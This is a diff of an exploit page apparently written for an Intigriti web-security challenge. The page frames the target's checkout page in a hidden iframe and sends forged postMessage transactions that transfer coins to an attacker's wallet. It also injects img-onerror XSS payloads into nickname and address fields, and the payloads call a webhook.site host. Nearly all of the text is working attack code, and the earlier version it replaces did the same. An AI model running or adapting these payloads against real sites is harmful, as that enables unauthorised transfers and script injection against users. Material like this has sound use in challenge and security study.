@@ -6,93 +6,75 @@
 <div id="log"></div>
 <script>
 const T = 'https://challenge-0126.intigriti.io';
-const W = 'https://webhook.site/a3a1e2a1-9f98-4553-bc84-7cdbea8fdf30';
-const WALLET = '16472226db03703a192aa383237035a69f';
+const W = 'https://webhook.site/8089eff3-ae85-4c51-954d-02c7930883b9';
+const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
 let s = 0;
 
-function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?'+s+'='+encodeURIComponent(m); }
+function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?step='+s+'&msg='+encodeURIComponent(m); }
 
 async function exploit() {
     log('STARTING');
 
-    // HTML entity XSS payload for username
-    const xssUser = 'test&lt;img src=x onerror=&quot;fetch(\''+W+'/?xss=1\',{mode:\'no-cors\'})&quot;&gt;';
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
+    document.body.appendChild(iframe);
 
-    try {
-        // Step 1: Register XSS user
-        log('Registering XSS user...');
-        const reg = await fetch(T+'/api/register',{
-            method:'POST',headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({username:xssUser,password:'Test123!'})
-        });
-        log('Register: '+reg.status);
-        const regData = await reg.json();
-        if(!reg.ok && !regData.error?.toLowerCase().includes('exists')) {
-            log('Register failed: '+JSON.stringify(regData));
+    await new Promise(r => iframe.onload = r);
+    await new Promise(r => setTimeout(r, 2000));
+    log('Iframe loaded');
+
+    // Approach 1: Try to send with nickname in postMessage (might be reflected)
+    log('Try 1: Nickname in extra field...');
+    iframe.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+            toAddress: WALLET,
+            currency: '1337COIN',
+            amount: 1,
+            nickname: '&lt;img src=x onerror=&quot;fetch(\''+W+'/?try1\',{mode:\'no-cors\'})&quot;&gt;'
         }
+    }, '*');
 
-        // Step 2: Login as XSS user
-        log('Logging in as XSS user...');
-        const login = await fetch(T+'/api/login',{
-            method:'POST',headers:{'Content-Type':'application/json'},
-            credentials:'include',
-            body:JSON.stringify({username:xssUser,password:'Test123!'})
-        });
-        log('Login: '+login.status);
+    await new Promise(r => setTimeout(r, 1000));
 
-        if(login.ok) {
-            // Step 3: Get XSS user's wallet address
-            log('Getting wallet address...');
-            const me = await fetch(T+'/api/me',{credentials:'include'});
-            const meData = await me.json();
-            log('me: '+JSON.stringify(meData));
-
-            const xssWallet = meData.wallets?.find(w => w.currency === '1337COIN');
-            if(xssWallet) {
-                log('XSS wallet: '+xssWallet.address);
-
-                // Step 4: Load checkout iframe
-                log('Loading checkout...');
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
-                document.body.appendChild(iframe);
-                await new Promise(r => setTimeout(r, 3000));
-
-                // Step 5: Send coins to XSS user via admin session
-                log('Sending coins to XSS user...');
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: xssWallet.address,
-                        currency: '1337COIN',
-                        amount: 1
-                    }
-                }, '*');
-                log('Coins sent to XSS user - XSS should trigger in marketwatch');
-
-                // Step 6: Also send to our wallet
-                await new Promise(r => setTimeout(r, 1000));
-                log('Sending to target wallet...');
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: WALLET,
-                        currency: '1337COIN',
-                        amount: 1
-                    }
-                }, '*');
-                log('Sent to target wallet');
-            }
-        }
-    } catch(e) {
-        log('Error: '+e.message);
+    // Approach 2: Send to many possible wallet addresses (brute force format)
+    log('Try 2: Test address formats...');
+    const prefixes = ['xss&lt;img src=x onerror=&quot;fetch(\''+W+'/?try2\',{mode:\'no-cors\'})&quot;&gt;', 'test'];
+    for(const p of prefixes) {
+        try {
+            iframe.contentWindow.postMessage({
+                type: 'submitTransaction',
+                transaction: {toAddress:p,currency:'1337COIN',amount:0}
+            }, '*');
+        } catch(e){}
     }
+
+    // Approach 3: Use data URI as address
+    await new Promise(r => setTimeout(r, 500));
+    log('Try 3: Data URI...');
+    iframe.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+            toAddress: 'data:text/html,&lt;img src=x onerror=&quot;fetch(\''+W+'/?try3\',{mode:\'no-cors\'})&quot;&gt;',
+            currency: '1337COIN',
+            amount: 0
+        }
+    }, '*');
+
+    await new Promise(r => setTimeout(r, 500));
+
+    // Approach 4: Send to target with amount 0 (might show in marketwatch)
+    log('Try 4: Send 0 to target...');
+    iframe.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {toAddress:WALLET,currency:'1337COIN',amount:0}
+    }, '*');
 
     await new Promise(r => setTimeout(r, 2000));
     log('Opening marketwatch...');
     window.open(T+'/marketwatch.html','_blank');
-    log('DONE');
+    log('DONE - check webhook for any XSS execution');
 }
 
 setTimeout(exploit, 1000);
